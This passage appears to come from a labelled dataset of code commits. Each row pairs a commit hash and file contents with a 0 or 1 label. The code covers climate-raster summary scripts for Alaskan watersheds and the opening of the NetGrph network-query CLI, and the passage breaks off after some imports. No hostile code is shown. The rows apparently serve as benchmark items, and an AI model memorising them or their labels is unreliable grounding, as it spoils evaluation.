	masks = subdomains.sub_domains

	# make sure no NoData pixels are in the domain
	nodata_mask = rst.read_masks( 1 ) # mask where zero
	for count, mask in enumerate( masks ):
		mask[ nodata_mask == 0 ] = 0
		masks[ count ] = mask

	for variable in variables:
		all_data = {}
		for model, scenario in itertools.product( models, scenarios ):
			if scenario == 'historical':
				decades = [(1900,1909),(1910, 1919),(1920, 1929),(1930, 1939),(1940, 1949),\
							(1950, 1959),(1960, 1969),(1970, 1979),(1980, 1989),(1990, 1999),(2000,2009),(2010, 2014)]
				begin = 1901
				end = 2014
			else:
				decades = [(2006,2009),(2010, 2019),(2020, 2029),(2030, 2039),(2040, 2049),(2050, 2059),\
							(2060, 2069),(2070, 2079),(2080, 2089),(2090, 2099)]
				begin = 2006
				end = 2100

			for decade in decades:
				print( 'running: {} {} {} {}'.format( model, variable, scenario, decade ) )
				for mask in masks:
					domain_num, = np.unique(mask[mask > 0])
					domain_name = subdomains.names_dict[ domain_num ].replace( ' ', '' )
					# run it
					all_data.update( get_metrics( base_path, variable, model, scenario, decade, mask, domain_name, ncpus ) )

		# write it out to disk
		if not os.path.exists( output_path ):
			os.makedirs( output_path )
		
		prefix = '_'.join([ variable, project, 'decadal', 'summaries', str(begin_out), str(end_out) ])

		# its LONG FORMAT output with all datas in rows for a single var/metric
		output_filename = os.path.join( output_path, prefix + '.json' )
		with open( output_filename, 'w' ) as out_json:
			json.dump( all_data, out_json )

		# now some panel-y stuff with the output JSON
		panel = pd.Panel( deepcopy( all_data ) ).copy()
		metrics = ['mean','max','min','stdev']
		for metric in metrics:
			df = panel[ :, metric, : ].T
			# sort the months
			df = df[ [ '01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12' ] ]
			output_filename = os.path.join( output_path, prefix + '_' + metric +'.csv' )
			if variable == 'pr':
				df = df.astype( np.float ).round( 0 ).astype( np.int )
				# output to csv -- int so no rounding needed.
				df.to_csv( output_filename, sep=',')
			else:
				df = df.astype( np.float32 )
				# round tas* to single decimal place
				df = df.copy().round( decimals=1 )
				# output ensuring single decimal place as string
				df.apply( lambda x: x.apply( lambda x: '%2.1f' % x) ).to_csv( output_filename, sep=',', float_format='%11.6f')
/n/n/n",0
185,10ef0417268197b2dcc85a791314fa55e74941dd,"/snap_scripts/epscor_sc/model_diffs_metrics_epscor_sc.py/n/n# maybe read in the baseline
# then loop through reads of all models...
# perform the diff
# then groupby month and compute means / stdev

def sort_files( files, split_on='_', elem_month=-2, elem_year=-1 ):
	'''
	sort a list of files properly using the month and year parsed
	from the filename.  This is useful with SNAP data since the standard
	is to name files like '<prefix>_MM_YYYY.tif'.  If sorted using base
	Pythons sort/sorted functions, things will be sorted by the first char
	of the month, which makes thing go 1, 11, ... which sucks for timeseries
	this sorts it properly following SNAP standards as the default settings.

	ARGUMENTS:
	----------
	files = [list] list of `str` pathnames to be sorted by month and year. usually from glob.glob.
	split_on = [str] `str` character to split the filename on.  default:'_', SNAP standard.
	elem_month = [int] slice element from resultant split filename list.  Follows Python slicing syntax.
		default:-2. For SNAP standard.
	elem_year = [int] slice element from resultant split filename list.  Follows Python slicing syntax.
		default:-1. For SNAP standard.

	RETURNS:
	--------
	sorted `list` by month and year ascending. 

	'''
	import pandas as pd
	months = [ int(fn.split('.')[0].split( split_on )[elem_month]) for fn in files ]
	years = [ int(fn.split('.')[0].split( split_on )[elem_year]) for fn in files ]
	df = pd.DataFrame( {'fn':files, 'month':months, 'year':years} )
	df_sorted = df.sort_values( ['year', 'month' ] )
	return df_sorted.fn.tolist()

def only_years( files, begin=1901, end=2100, split_on='_', elem_year=-1 ):
	'''
	return new list of filenames where they are truncated to begin:end

	ARGUMENTS:
	----------
	files = [list] list of `str` pathnames to be sorted by month and year. usually from glob.glob.
	begin = [int] four digit integer year of the begin time default:1901
	end = [int] four digit integer year of the end time default:2100
	split_on = [str] `str` character to split the filename on.  default:'_', SNAP standard.
	elem_year = [int] slice element from resultant split filename list.  Follows Python slicing syntax.
		default:-1. For SNAP standard.

	RETURNS:
	--------
	sliced `list` to begin and end year.
	'''
	import pandas as pd
	years = [ int(fn.split('.')[0].split( split_on )[elem_year]) for fn in files ]
	df = pd.DataFrame( { 'fn':files, 'year':years } )
	df_slice = df[ (df.year >= begin ) & (df.year <= end ) ]
	return df_slice.fn.tolist()

class SubDomains( object ):
	'''
	rasterize subdomains shapefile to ALFRESCO AOI of output set
	'''
	def __init__( self, subdomains_fn, rasterio_raster, id_field, name_field, background_value=0, *args, **kwargs ):
		'''
		initializer for the SubDomains object
		The real magic here is that it will use a generator to loop through the 
		unique ID's in the sub_domains raster map generated.
		'''
		import numpy as np
		self.subdomains_fn = subdomains_fn
		self.rasterio_raster = rasterio_raster
		self.id_field = id_field
		self.name_field = name_field
		self.background_value = background_value
		self._rasterize_subdomains( )
		self._get_subdomains_dict( )

	def _rasterize_subdomains( self ):
		'''
		rasterize a subdomains shapefile to the extent and resolution of 
		a template raster file. The two must be in the same reference system 
		or there will be potential issues. 
		returns:
			numpy.ndarray with the shape of the input raster and the shapefile
			polygons burned in with the values of the id_field of the shapefile
		gotchas:
			currently the only supported data type is uint8 and all float values will be
			coerced to integer for this purpose.  Another issue is that if there is a value
			greater than 255, there could be some error-type issues.  This is something that 
			the user needs to know for the time-being and will be fixed in subsequent versions
			of rasterio.  Then I can add the needed changes here.
		'''
		import geopandas as gpd
		import numpy as np

		gdf = gpd.read_file( self.subdomains_fn )
		id_groups = gdf.groupby( self.id_field ) # iterator of tuples (id, gdf slice)

		out_shape = self.rasterio_raster.height, self.rasterio_raster.width
		out_transform = self.rasterio_raster.affine

		arr_list = [ self._rasterize_id( df, value, out_shape, out_transform, background_value=self.background_value ) for value, df in id_groups ]
		self.sub_domains = arr_list
	@staticmethod
	def _rasterize_id( df, value, out_shape, out_transform, background_value=0 ):
		from rasterio.features import rasterize
		geom = df.geometry
		out = rasterize( ( ( g, value ) for g in geom ),
							out_shape=out_shape,
							transform=out_transform,
							fill=background_value )
		return out
	def _get_subdomains_dict( self ):
		import geopandas as gpd
		gdf = gpd.read_file( self.subdomains_fn )
		self.names_dict = dict( zip( gdf[self.id_field], gdf[self.name_field] ) )

def diff( x, y, *args, **kwargs ):
	'''
	difference between 2 np.arrays representing 
	2-D rasters in the format : GeoTiff

	ARGUMENTS:
	----------
	x = [str] path to the baseline GeoTiff
	y = [str] path to the modeled GeoTiff

	RETURNS:
	-------
	difference of the 2 arrays as a 2D numpy array
	( y - x )
	
	'''
	import rasterio
	baseline = rasterio.open( x ).read( 1 )
	modeled = rasterio.open( y ).read( 1 )
	return ( modeled - baseline  )

def wrap_diff( x ):
	''' simple wrapper for multiprocessing '''
	return diff( *x )

def get_metrics( base_path, variable, model, scenario, decade, mask, domain_name=None, ncpus=32 ):
	'''
	main function to return monthly summary stats for the group
	as a `dict`
	'''
	decade_begin, decade_end = decade
	modeled_files = glob.glob( os.path.join( base_path, model, scenario, variable, '*.tif' ) )
	modeled_files = sort_files( only_years( modeled_files, begin=decade_begin, end=decade_end, split_on='_', elem_year=-1 ) )
	
	# groupby month here
	month_grouped = pd.Series( modeled_files ).groupby([ os.path.basename(i).split('_')[-2] for i in modeled_files ])
	month_grouped = { i:j.tolist() for i,j in month_grouped } # make a dict
	
	month_dict = {}
	for month in month_grouped:
		modeled = month_grouped[ month ]
		# change the model name to the baseline model in the series for comparison
		baseline = [ fn.replace( model, '5ModelAvg' ) for fn in modeled ]
		args = zip( baseline, modeled )

		# get diffs in parallel
		pool = mp.Pool( ncpus )
		arr = np.array( pool.map( wrap_diff, args ) )
		pool.close()
		pool.join()
		pool.terminate()
		pool = None

		# this derives a mean from 3D (time, x, y) to 2D (x, y)
		mean_arr = np.mean( arr, axis=0 )
		arr = None
		masked = np.ma.masked_array( mean_arr, mask == 0 )

		# calculate metrics across the 2D space
		month_dict[ str(month) ] = { 'stdev':str( np.std( masked ) ),
									'mean':str( np.mean( masked ) ),
									'min':str( np.min( masked ) ),
									'max':str( np.max( masked ) ) }

		# domain_name
		if domain_name == None:
			domain_name, = str( np.unique( mask > 0 ) )
	
	return { '_'.join([ model, scenario, variable, domain_name, str(decade_begin), str(decade_end) ]) : month_dict }

if __name__ == '__main__':
	import os, glob, itertools, rasterio, json
	from copy import deepcopy
	import xarray as xr
	import numpy as np
	import pandas as pd
	from pathos import multiprocessing as mp

	# setup args
	base_path = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/EPSCOR_SC_DELIVERY_AUG2016/derived/grids'
	output_path = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/EPSCOR_SC_DELIVERY_AUG2016/derived/tabular'
	ncpus = 32
	project = 'cmip5'
	variables = [ 'tasmin', 'tasmax', 'tas', 'pr' ]
	models = [ 'IPSL-CM5A-LR', 'MRI-CGCM3', 'GISS-E2-R', 'GFDL-CM3', 'NCAR-CCSM4' ]
	scenarios = [ 'historical', 'rcp26', 'rcp45', 'rcp60', 'rcp85' ]
	template_rst = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/EPSCOR_SC_DELIVERY_AUG2016/downscaled/NCAR-CCSM4/historical/tasmax/tasmax_mean_C_ar5_NCAR-CCSM4_historical_01_1901.tif'
	rst = rasterio.open( template_rst )
	# subdomain_fn = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/SCTC_studyarea/Kenai_StudyArea.shp'
	subdomain_fn = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/SCTC_studyarea/SCTC_watersheds.shp'
	
	# create the rasterized version of the input shapefile for spatial query
	# subdomains = SubDomains( subdomain_fn, rst, id_field='OBJECTID', name_field='OBJECTID', background_value=0 )
	subdomains = SubDomains( subdomain_fn, rst, id_field='OBJECTID', name_field='HU_12_Name', background_value=0 )
	masks = subdomains.sub_domains

	# make sure no NoData pixels are in the domain
	nodata_mask = rst.read_masks( 1 ) # mask where zero
	for count, mask in enumerate( masks ):
		mask[ nodata_mask == 0 ] = 0
		masks[ count ] = mask

	for variable in variables:
		print( variable )
		all_data = {}
		for model, scenario in itertools.product( models, scenarios ):
			if scenario == 'historical':
				decades = [(1900,1909),(1910, 1919),(1920, 1929),(1930, 1939),(1940, 1949),\
							(1950, 1959),(1960, 1969),(1970, 1979),(1980, 1989),(1990, 1999),(2000,2005)]
			else:
				decades = [(2006,2009),(2010, 2019),(2020, 2029),(2030, 2039),(2040, 2049),(2050, 2059),\
							(2060, 2069),(2070, 2079),(2080, 2089),(2090, 2099)]

			for decade in decades:
				if scenario == 'historical':
					begin = 1900
					end = 2005
				else:
					begin = 2006
					end = 2100
			
				print( 'running: {} {} {} {}'.format( model, variable, scenario, decade ) )

				for mask in masks:
					domain_num, = np.unique(mask[mask > 0])
					domain_name = subdomains.names_dict[ domain_num ].replace( ' ', '' )
					# run it

					all_data.update( get_metrics( base_path, variable, model, scenario, decade, mask, domain_name, ncpus ) )
		
		# write it out to disk
		if not os.path.exists( output_path ):
			os.makedirs( output_path )
		
		prefix = '_'.join([ variable, project, 'decadals', '5ModelAvg_diff','summaries', str(1900), str(2100) ])

		# its LONG FORMAT output with all datas in rows for a single var/metric
		output_filename = os.path.join( output_path, prefix + '.json' )
		with open( output_filename, 'w' ) as out_json:
			json.dump( all_data, out_json )

		# now some panel-y stuff with the output JSON
		panel = pd.Panel( deepcopy( all_data ) ).copy()
		metrics = ['mean','max','min','stdev']
		for metric in metrics:
			df = panel[ :, metric, : ].T
			# sort the months
			df = df[ [ '01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12' ] ]
			output_filename = os.path.join( output_path, prefix + '_' + metric +'.csv' )
			if variable == 'pr':
				df = df.astype( np.float ).round( 0 ).astype( np.int )
				# output to csv -- int so no rounding needed.
				df.to_csv( output_filename, sep=',')
			else:
				df = df.astype( np.float32 )
				# round tas* to single decimal place
				df = df.copy().round( decimals=1 )
				# output ensuring single decimal place as string
				df.apply( lambda x: x.apply( lambda x: '%2.1f' % x) ).to_csv( output_filename, sep=',', float_format='%11.6f')
/n/n/n/snap_scripts/epscor_sc/model_variability_metrics_epscor_sc_DECADAL_multidomain_cru.py/n/n# maybe read in the baseline
# then loop through reads of all models...
# perform the diff
# then groupby month and compute means / stdev

def sort_files( files, split_on='_', elem_month=-2, elem_year=-1 ):
	'''
	sort a list of files properly using the month and year parsed
	from the filename.  This is useful with SNAP data since the standard
	is to name files like '<prefix>_MM_YYYY.tif'.  If sorted using base
	Pythons sort/sorted functions, things will be sorted by the first char
	of the month, which makes thing go 1, 11, ... which sucks for timeseries
	this sorts it properly following SNAP standards as the default settings.

	ARGUMENTS:
	----------
	files = [list] list of `str` pathnames to be sorted by month and year. usually from glob.glob.
	split_on = [str] `str` character to split the filename on.  default:'_', SNAP standard.
	elem_month = [int] slice element from resultant split filename list.  Follows Python slicing syntax.
		default:-2. For SNAP standard.
	elem_year = [int] slice element from resultant split filename list.  Follows Python slicing syntax.
		default:-1. For SNAP standard.

	RETURNS:
	--------
	sorted `list` by month and year ascending. 

	'''
	import pandas as pd
	months = [ int(fn.split('.')[0].split( split_on )[elem_month]) for fn in files ]
	years = [ int(fn.split('.')[0].split( split_on )[elem_year]) for fn in files ]
	df = pd.DataFrame( {'fn':files, 'month':months, 'year':years} )
	df_sorted = df.sort_values( ['year', 'month' ] )
	return df_sorted.fn.tolist()

def only_years( files, begin=1901, end=2100, split_on='_', elem_year=-1 ):
	'''
	return new list of filenames where they are truncated to begin:end

	ARGUMENTS:
	----------
	files = [list] list of `str` pathnames to be sorted by month and year. usually from glob.glob.
	begin = [int] four digit integer year of the begin time default:1901
	end = [int] four digit integer year of the end time default:2100
	split_on = [str] `str` character to split the filename on.  default:'_', SNAP standard.
	elem_year = [int] slice element from resultant split filename list.  Follows Python slicing syntax.
		default:-1. For SNAP standard.

	RETURNS:
	--------
	sliced `list` to begin and end year.
	'''
	import pandas as pd
	years = [ int(fn.split('.')[0].split( split_on )[elem_year]) for fn in files ]
	df = pd.DataFrame( { 'fn':files, 'year':years } )
	df_slice = df[ (df.year >= begin ) & (df.year <= end ) ]
	return df_slice.fn.tolist()

class SubDomains( object ):
	'''
	rasterize subdomains shapefile to ALFRESCO AOI of output set
	'''
	def __init__( self, subdomains_fn, rasterio_raster, id_field, name_field, background_value=0, *args, **kwargs ):
		'''
		initializer for the SubDomains object
		The real magic here is that it will use a generator to loop through the 
		unique ID's in the sub_domains raster map generated.
		'''
		import numpy as np
		self.subdomains_fn = subdomains_fn
		self.rasterio_raster = rasterio_raster
		self.id_field = id_field
		self.name_field = name_field
		self.background_value = background_value
		self._rasterize_subdomains( )
		self._get_subdomains_dict( )

	def _rasterize_subdomains( self ):
		'''
		rasterize a subdomains shapefile to the extent and resolution of 
		a template raster file. The two must be in the same reference system 
		or there will be potential issues. 
		returns:
			numpy.ndarray with the shape of the input raster and the shapefile
			polygons burned in with the values of the id_field of the shapefile
		gotchas:
			currently the only supported data type is uint8 and all float values will be
			coerced to integer for this purpose.  Another issue is that if there is a value
			greater than 255, there could be some error-type issues.  This is something that 
			the user needs to know for the time-being and will be fixed in subsequent versions
			of rasterio.  Then I can add the needed changes here.
		'''
		import geopandas as gpd
		import numpy as np

		gdf = gpd.read_file( self.subdomains_fn )
		id_groups = gdf.groupby( self.id_field ) # iterator of tuples (id, gdf slice)

		out_shape = self.rasterio_raster.height, self.rasterio_raster.width
		out_transform = self.rasterio_raster.affine

		arr_list = [ self._rasterize_id( df, value, out_shape, out_transform, background_value=self.background_value ) for value, df in id_groups ]
		self.sub_domains = arr_list
	@staticmethod
	def _rasterize_id( df, value, out_shape, out_transform, background_value=0 ):
		from rasterio.features import rasterize
		geom = df.geometry
		out = rasterize( ( ( g, value ) for g in geom ),
							out_shape=out_shape,
							transform=out_transform,
							fill=background_value )
		return out
	def _get_subdomains_dict( self ):
		import geopandas as gpd
		gdf = gpd.read_file( self.subdomains_fn )
		self.names_dict = dict( zip( gdf[self.id_field], gdf[self.name_field] ) )

def f( x ):
	''' apply function for multiprocessing.pool 
		helps with clean i/o '''
	with rasterio.open( x ) as rst:
		arr = rst.read( 1 )
	return arr

def get_metrics( base_path, variable, model, scenario, decade, mask, domain_name=None, ncpus=32 ):
	'''
	main function to return monthly summary stats for the group
	as a `dict`
	'''
	decade_begin, decade_end = decade
	modeled_files = glob.glob( os.path.join( base_path, model, scenario, variable, '*.tif' ) )
	modeled_files = sort_files( only_years( modeled_files, begin=decade_begin, end=decade_end, split_on='_', elem_year=-1 ) )
	
	# groupby month here
	month_grouped = pd.Series( modeled_files ).groupby([ os.path.basename(i).split('_')[-2] for i in modeled_files ])
	month_grouped = { i:j.tolist() for i,j in month_grouped } # make a dict
	
	month_dict = {}
	for month in month_grouped:
		# get diffs in parallel
		pool = mp.Pool( ncpus )
		arr = np.array( pool.map( f, month_grouped[ month ] ) )
		pool.close()
		pool.join()
		pool.terminate()
		pool = None

		# this derives a mean from 3D (time, x, y) to 2D (x, y)
		mean_arr = np.mean( arr, axis=0 )
		arr = None
		masked = np.ma.masked_array( mean_arr, mask == 0 )

		# calculate metrics across the 2D space
		month_dict[ str(month) ] = { 'stdev':str( np.std( masked ) ),
									'mean':str( np.mean( masked ) ),
									'min':str( np.min( masked ) ),
									'max':str( np.max( masked ) ) }

		# domain_name
		if domain_name == None:
			domain_name, = str( np.unique( mask > 0 ) )
	
	return { '_'.join([ model, scenario, variable, domain_name, str(decade_begin), str(decade_end) ]) : month_dict }


if __name__ == '__main__':
	import os, glob, itertools, rasterio, json
	from copy import deepcopy
	import xarray as xr
	import numpy as np
	import pandas as pd
	from pathos import multiprocessing as mp

	# setup args
	base_path = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/EPSCOR_SC_DELIVERY_AUG2016/derived/grids'
	output_path = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/EPSCOR_SC_DELIVERY_AUG2016/derived/tabular'
	ncpus = 32
	project = 'cru'
	variables = [ 'tasmin', 'tasmax', 'tas', 'pr' ]
	models = [ 'ts323' ]
	scenarios = [ 'historical' ]
	begin_out = 1901
	end_out = 2014
	template_rst = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/EPSCOR_SC_DELIVERY_AUG2016/downscaled/NCAR-CCSM4/historical/tasmax/tasmax_mean_C_ar5_NCAR-CCSM4_historical_01_1901.tif'
	rst = rasterio.open( template_rst )
	# subdomain_fn = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/SCTC_studyarea/Kenai_StudyArea.shp'
	subdomain_fn = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/SCTC_studyarea/SCTC_watersheds.shp'

	# create the rasterized version of the input shapefile for spatial query
	# subdomains = SubDomains( subdomain_fn, rst, id_field='OBJECTID', name_field='OBJECTID', background_value=0 )
	subdomains = SubDomains( subdomain_fn, rst, id_field='OBJECTID', name_field='HU_12_Name', background_value=0 )
	masks = subdomains.sub_domains

	# make sure no NoData pixels are in the domain
	nodata_mask = rst.read_masks( 1 ) # mask where zero
	for count, mask in enumerate( masks ):
		mask[ nodata_mask == 0 ] = 0
		masks[ count ] = mask

	for variable in variables:
		all_data = {}
		for model, scenario in itertools.product( models, scenarios ):
			if scenario == 'historical':
				decades = [(1900,1909),(1910, 1919),(1920, 1929),(1930, 1939),(1940, 1949),\
							(1950, 1959),(1960, 1969),(1970, 1979),(1980, 1989),(1990, 1999),(2000,2009),(2010, 2014)]
				begin = 1901
				end = 2014
			else:
				decades = [(2006,2009),(2010, 2019),(2020, 2029),(2030, 2039),(2040, 2049),(2050, 2059),\
							(2060, 2069),(2070, 2079),(2080, 2089),(2090, 2099)]
				begin = 2006
				end = 2100

			for decade in decades:
				print( 'running: {} {} {} {}'.format( model, variable, scenario, decade ) )
				for mask in masks:
					domain_num, = np.unique(mask[mask > 0])
					domain_name = subdomains.names_dict[ domain_num ].replace( ' ', '' )
					# run it
					all_data.update( get_metrics( base_path, variable, model, scenario, decade, mask, domain_name, ncpus ) )

		# write it out to disk
		if not os.path.exists( output_path ):
			os.makedirs( output_path )
		
		prefix = '_'.join([ variable, project, 'decadal', 'summaries', str(begin_out), str(end_out) ])

		# its LONG FORMAT output with all datas in rows for a single var/metric
		output_filename = os.path.join( output_path, prefix + '.json' )
		with open( output_filename, 'w' ) as out_json:
			json.dump( all_data, out_json )

		# now some panel-y stuff with the output JSON
		panel = pd.Panel( deepcopy( all_data ) ).copy()
		metrics = ['mean','max','min','stdev']
		for metric in metrics:
			df = panel[ :, metric, : ].T
			# sort the months
			df = df[ [ '01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12' ] ]
			output_filename = os.path.join( output_path, prefix + '_' + metric +'.csv' )
			if variable == 'pr':
				df = df.astype( np.float ).round( 0 ).astype( np.int )
				# output to csv -- int so no rounding needed.
				df.to_csv( output_filename, sep=',')
			else:
				df = df.astype( np.float32 )
				# round tas* to single decimal place
				df = df.copy().round( decimals=1 )
				# output ensuring single decimal place as string
				df.apply( lambda x: x.apply( lambda x: '%2.1f' % x) ).to_csv( output_filename, sep=',', float_format='%11.6f')
/n/n/n",1
186,ad1a94ea8e264996a2f29f6041c40f2874d7b949,"netgrph.py/n/n#!/usr/bin/env python3
#
# NetGrph Database CLI Query Tool
#
# Copyright (c) 2016 ""Jonathan Yantis""
#
# This file is a part of NetGrph.
#
#    This program is free software: you can redistribute it and/or  modify
#    it under the terms of the GNU Affero General Public License, version 3,
#    as published by the Free Software Foundation.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#    As a special exception, the copyright holders give permission to link the
#    code of portions of this program with the OpenSSL library under certain
#    conditions as described in each individual source file and distribute
#    linked combinations including the program with the OpenSSL library. You
#    must comply with the GNU Affero General Public License in all respects
#    for all of the code used other than as permitted herein. If you modify
#    file(s) with this exception, you may extend this exception to your
#    version of the file(s), but you are not obligated to do so. If you do not
#    wish to do so, delete this exception statement from your version. If you
#    delete this exception statement from all source files in the program,
#    then also delete it in the license file.
#
#
""""""netgrph is the primary CLI query too for NetGrph
   Also see ngreport
""""""
import os
import re
import argparse
import nglib
import nglib.query


# Default Config File Location
config_file = '/etc/netgrph.ini'
alt_config = './docs/netgrph.ini'

# Test/Dev Config
dirname = os.path.dirname(os.path.realpath(__file__))
if re.search(r'\/dev$', dirname):
    config_file = 'netgrphdev.ini'
elif re.search(r'\/test$', dirname):
    config_file = ""netgrphdev.ini""

parser = argparse.ArgumentParser()

parser = argparse.ArgumentParser(prog='netgrph',
                                 description='Query the NetGrph Database',
                                 epilog=""""""
                                 Examples:
                                 netgrph 10.1.1.1 (Free Search for IP),
                                 netgrph -net 10.1.1.0/24 (Search for CIDR),
                                 netgrph -group MDC (VLAN Database Search),
                                 netgrph -fp 10.1.1.1 10.2.2.1 (Firewall Path Search)
                                 """""")

parser.add_argument(""search"", help=""Search the NetGrph Database (Wildcard Default)"",
                    type=str)
parser.add_argument(""-ip"", help=""Network Details for an IP"",
                    action=""store_true"")
parser.add_argument(""-net"", help=""All networks within a CIDR (eg. 10.0.0.0/8)"",
                    action=""store_true"")
parser.add_argument(""-nlist"", help=""Get all networks in an alert group"",
                    action=""store_true"")
parser.add_argument(""-nfilter"", help=""Get all networks on a filter (see netgrph.ini)"",
                    action=""store_true"")
parser.add_argument(""-dev"", help=""Get the Details for a Device (Switch/Router/FW)"",
                    action=""store_true"")
parser.add_argument(""-path"", metavar=""src"",
                    help=""Full Path Between -p src dst (ip/cidr, prefers NetDB)"",
                    type=str)
parser.add_argument(""-fpath"", metavar=""src"",
                    help=""Security Path between -fp src dst"",
                    type=str)
parser.add_argument(""-rpath"", metavar=""src"",
                    help=""Routed Path between -rp IP/CIDR1 IP/CIDR2 "",
                    type=str)
parser.add_argument(""-spath"", metavar=""src"",
                    help=""Switched Path between -sp sw1 sw2 (Neo4j Regex)"",
                    type=str)
parser.add_argument(""-allpaths"",
                    help=""Show all Paths (defaults to single path)"",
                    action=""store_true"")
parser.add_argument(""-group"", help=""Get VLANs for a Management Group"",
                    action=""store_true"")
parser.add_argument(""-vrange"", metavar='1[-4096]', help=""VLAN Range (default 1-1999)"",
                    type=str)
parser.add_argument(""-vid"", help=""VLAN ID Search"", action=""store_true"")
parser.add_argument(""-vtree"", help=""Get the VLAN Tree for a VNAME"",
                    action=""store_true"")
parser.add_argument(""-output"", metavar='TREE',
                    help=""Return Format: TREE, TABLE, CSV, JSON, YAML"", type=str)
parser.add_argument(""--days"", metavar='int', help=""Days in Past (NetDB Specific)"", type=int)
parser.add_argument(""--conf"", metavar='file', help=""Alternate Config File"", type=str)
parser.add_argument(""--debug"", help=""Set debugging level"", type=int)
parser.add_argument(""--verbose"", help=""Verbose Output"", action=""store_true"")

args = parser.parse_args()

# Alternate Config File
if args.conf:
    config_file = args.conf

# Test configuration exists
if not os.path.exists(config_file):
    if not os.path.exists(alt_config):
        raise Exception(""Configuration File not found"", config_file)
    else:
        config_file = alt_config

verbose = 0
if args.verbose:
    verbose = 1
if args.debug:
    verbose = args.debug

# 7 day default for NetDB
if not args.days:
    args.days = 7

# Default VLAN Range
if not args.vrange:
    args.vrange = ""1-1999""
if args.output:
    args.output = args.output.upper()

# Setup Globals for Debugging
nglib.verbose = verbose

# Initialize Library
nglib.init_nglib(config_file)

# Pathfinding Variable
onepath = True
if args.allpaths:
    onepath = False

## Pathfinding
if args.fpath:
    nglib.query.path.get_fw_path(args.fpath, args.search)

elif args.spath:
    rtype = ""TREE""
    if args.output:
        rtype = args.output
    nglib.query.path.get_switched_path(args.spath, args.search, rtype=rtype, onepath=onepath)

elif args.rpath:
    rtype = ""TREE""
    if args.output:
        rtype = args.output
    nglib.query.path.get_routed_path(args.rpath, args.search, rtype=rtype, onepath=onepath)

elif args.path:
    rtype = ""TREE""
    if args.output:
        rtype = args.output
    nglib.query.path.get_full_path(args.path, args.search, rtype=rtype, onepath=onepath)

## Individual Queries
elif args.dev:
    rtype = ""TREE""
    if args.output:
        rtype = args.output
    nglib.query.dev.get_device(args.search, rtype=rtype, vrange=args.vrange)

elif args.ip:
    rtype = ""TREE""
    if args.output:
        rtype = args.output

    nglib.query.net.get_net(args.search, rtype=rtype, days=args.days)

elif args.net:
    rtype = ""CSV""
    if args.output:
        rtype = args.output
    nglib.query.net.get_networks_on_cidr(args.search, rtype=rtype)

elif args.nlist:
    rtype = ""CSV""
    if args.output:
        rtype = args.output
    nglib.query.net.get_networks_on_filter(args.search, rtype=rtype)

elif args.nfilter:
    rtype = ""CSV""
    if args.output:
        rtype = args.output
    nglib.query.net.get_networks_on_filter(nFilter=args.search, rtype=rtype)

elif args.group:
    nglib.query.vlan.get_vlans_on_group(args.search, args.vrange)

elif args.vtree:
    rtype = ""TREE""
    if args.output:
        rtype = args.output
    nglib.query.vlan.get_vtree(args.search, rtype=rtype)

elif args.vid:
    rtype = ""TREE""
    if args.output:
        rtype = args.output
    nglib.query.vlan.search_vlan_id(args.search, rtype=rtype)

# Universal Search
elif args.search:

    # Try VLAN ID First
    # try:
    #     #vid = int(args.search)
    #
    #     if vid >= 0 and vid <= 4096:
    #         rtype = ""TREE""
    #         if args.output: rtype = args.output
    #         nglib.query.searchVLANID(args.search,rtype=rtype)
    # except:
    vid = re.search(r'^(\d+)$', args.search)
    vname = re.search(r'^(\w+\-\d+)$', args.search)
    ip = re.search(r'^(\d+\.\d+\.\d+\.\d+)$', args.search)
    net = re.search(r'^(\d+\.\d+\.\d+\.\d+\/\d+)$', args.search)
    text = re.search(r'^(\w+)$', args.search)

    if vid:
        try:
            if int(args.search) >= 0 and int(args.search) <= 4096:
                rtype = ""TREE""
                if args.output:
                    rtype = args.output
                nglib.query.vlan.search_vlan_id(args.search, rtype=rtype)
        except:
            pass
    elif vname:
        rtype = ""TREE""
        if args.output:
            rtype = args.output
        nglib.query.vlan.get_vtree(args.search, rtype=rtype)
    elif net:
        rtype = ""CSV""
        if args.output:
            rtype = args.output
        nglib.query.net.get_networks_on_cidr(args.search, rtype=rtype)
    elif ip:
        rtype = ""TREE""
        if args.output:
            rtype = args.output
        nglib.query.net.get_net(args.search, rtype=rtype, days=args.days)
    elif text:
        rtype = ""TREE""
        if args.output:
            rtype = args.output
        nglib.query.universal_text_search(args.search, args.vrange, rtype=rtype)
    else:
        print(""Unknown Search:"", args.search)

else:
    parser.print_help()
    print()
/n/n/nnglib/query/path.py/n/n#!/usr/bin/env python
#
# Copyright (c) 2016 ""Jonathan Yantis""
#
# This file is a part of NetGrph.
#
#    This program is free software: you can redistribute it and/or  modify
#    it under the terms of the GNU Affero General Public License, version 3,
#    as published by the Free Software Foundation.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#    As a special exception, the copyright holders give permission to link the
#    code of portions of this program with the OpenSSL library under certain
#    conditions as described in each individual source file and distribute
#    linked combinations including the program with the OpenSSL library. You
#    must comply with the GNU Affero General Public License in all respects
#    for all of the code used other than as permitted herein. If you modify
#    file(s) with this exception, you may extend this exception to your
#    version of the file(s), but you are not obligated to do so. If you do not
#    wish to do so, delete this exception statement from your version. If you
#    delete this exception statement from all source files in the program,
#    then also delete it in the license file.
""""""
Network Path Algorithms Between Switches and Routers

""""""
import re
import sys
import logging
import subprocess
